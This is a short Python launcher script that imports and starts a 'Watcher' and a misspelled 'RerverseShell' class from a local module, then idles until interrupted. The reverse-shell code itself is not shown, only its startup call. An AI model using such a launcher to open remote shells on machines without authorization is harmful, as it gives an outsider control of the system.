import time
from utils.watcher import RerverseShell, Watcher


if __name__ == "__main__":    

    Watcher().initialize()

    RerverseShell().initialize()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")   